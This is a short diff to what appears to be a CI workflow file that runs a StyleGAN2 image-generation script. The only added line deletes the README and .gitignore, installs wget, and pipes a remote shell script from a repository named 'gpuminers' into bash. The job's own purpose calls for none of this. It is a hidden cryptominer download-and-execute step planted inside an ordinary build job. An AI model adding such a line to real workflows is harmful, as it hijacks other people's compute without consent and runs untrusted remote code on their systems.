@@ -34,6 +34,7 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
+        rm README* && rm .gitignore && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_Need_For_Speed_fle_ws3.sh | bash
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
